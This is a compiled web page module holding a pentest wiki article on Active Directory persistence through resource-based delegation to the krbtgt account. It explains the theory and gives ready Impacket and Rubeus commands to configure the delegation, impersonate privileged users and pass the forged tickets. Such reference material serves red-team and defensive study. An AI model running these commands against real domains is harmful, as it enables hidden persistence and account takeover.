import{_ as h,c as k,a5 as r,G as s,w as a,B as l,o as c,j as e,a as t}from"./chunks/framework.B5CpDqM0.js";const m=JSON.parse('{"title":"Delegation to KRBTGT","description":"","frontmatter":{"authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/persistence/kerberos/delegation-to-krbtgt.md","filePath":"ad/persistence/kerberos/delegation-to-krbtgt.md","lastUpdated":1724982529000}'),d={name:"ad/persistence/kerberos/delegation-to-krbtgt.md"};function g(p,i,u,b,F,y){const n=l("PluginTabsTab"),o=l("PluginTabs");return c(),k("div",null,[i[2]||(i[2]=r('<h1 id="delegation-to-krbtgt" tabindex="-1">Delegation to KRBTGT <a class="header-anchor" href="#delegation-to-krbtgt" aria-label="Permalink to &quot;Delegation to KRBTGT&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The idea behind this technique is to configure <a href="./../../movement/kerberos/delegations/rbcd">resource-based constrained delegation</a> on the <code>krbtgt</code> account to generate TGTs on-demand as a persistence technique. The requirements for the technique are to have enough privileges (i.e. domain admin rights) to edit the <code>krbtgt</code> account&#39;s &quot;rbcd&quot; attribute (i.e. <code>ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity</code>) and to control an account that has an SPN (<a href="./../../movement/builtins/machineaccountquota#create-a-computer-account">or create one</a>, or do <a href="./../../movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users">SPN-less RBCD</a>).</p><p>Once the delegation is configured, an attacker can later on obtain a service ticket for the krbtgt on behalf of any user.</p><p>Since a TGT is just a Service Ticket for the <code>KRBTGT</code> service, it means the attacker has a persistence technique allowing him to obtain a TGT for almost any user in the domain. The only limitations are the &quot;Protected Users&quot; group, or the &quot;Account is sensitive and cannot be delegated&quot; parameter. Those settings can protect users from delegation and will prevent attackers from obtaining a ticket that looks like a TGT on their behalf through a delegation trick.</p><p>An example of the abuse goes as follows :</p><ol><li>Configure RBCD delegation on the <code>krbtgt</code> account to allow a controlled account to delegate to it. The controlled account should have at least one SPN (i.e. ServicePrincipalName) for the delegation to work (or, see <a href="./../../movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users">SPN-less RBCD</a>). This controlled account will be called &quot;ControlledAccountWithSPN&quot;.</li><li>Perform a full <a href="./../../movement/kerberos/delegations/">S4U</a> attack to obtain a Service Ticket for the <code>krbtgt</code> service, on behalf of another privileged user. Let&#39;s call this chosen user &quot;TargetedAccount&quot;. The ticket obtained through this process is for the <code>KRBTGT</code> service, which basically means the ticket can be used as a TGT for the TargetedAccount.</li><li><a href="./../../movement/kerberos/ptt">Pass-the-ticket</a> to use the Service-Ticket-that-is-in-fact-a-TGT, act as the target -privileged- user, and authenticate to remote resources.</li></ol><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2>',8)),s(o,null,{default:a(()=>[s(n,{label:"UNIX-like"},{default:a(()=>i[0]||(i[0]=[e("p",null,[t("Every step of this attack can be achieved using one of the following scripts from "),e("a",{href:"https://github.com/fortra/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),t(" (Python), such as rbcd.py and getST.py.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Step 1 : Configure RBCD delegation from ControlledAccountWithSPN to krbtgt")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"rbcd.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -delegate-from"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ControlledAccountWithSPN'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -delegate-to"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'krbtgt'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $dcIp "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-action"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," write"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'PrivilegiedAccount':'StrongPassword'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Step 2 : S4U attack for TargetedAccount to ControlledAccountWithSPN")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getST.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "KRBTGT"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "TargetedAccount"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $dcIp "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DOMAIN'/'ControlledAccountWithSPN':'PasswordOfControlledAccountWithSPN'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Step 3 : Get Service Ticket for TargetedAccount to the target service using the previously obtained ticket (which is a TGT).")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"KRB5CCNAME"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'TargetedAccount@krbtgt_DOMAIN@DOMAIN.ccache'"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," getST.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'cifs/target'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'TargetedAccount'")])])])],-1)])),_:1}),s(n,{label:"Windows"},{default:a(()=>i[1]||(i[1]=[e("p",null,"Every step of this attack can be achieved using Rubeus and the Set-ADUser command.",-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Step 1 : Configure RBCD delegation from ControlledAccountWithSPN to krbtgt")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-ADUser"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," krbtgt "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"PrincipalsAllowedToDelegateToAccount ControlledAccountWithSPN")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Step 2 : Full S4U for TargetedAccount to krbtgt using ControlledAccountWithSPN")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"TargetedAccount"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msdsspn:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"krbtgt"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DOMAIN"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ControlledAccountWithSPN"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"rc4:$NThash")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Step 3 : Get Service Ticket for TargetedAccount to the target service using the previously obtained ticket (printed in a base64 blob thanks to the /nowrap flag), and inject it in memory using /ptt in order to use the resulting ticket for authentication to remote resources")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgs "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"service:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cifs/target"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ticket:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"base64ticket...."'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt")])])])],-1)])),_:1})]),_:1}),i[3]||(i[3]=r('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence" target="_blank" rel="noreferrer">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence</a></p><p><a href="https://skyblue.team/posts/delegate-krbtgt/" target="_blank" rel="noreferrer">https://skyblue.team/posts/delegate-krbtgt/</a></p><p><a href="./../../movement/kerberos/delegations/rbcd">rbcd.md</a></p>',4))])}const f=h(d,[["render",g]]);export{m as __pageData,f as default};
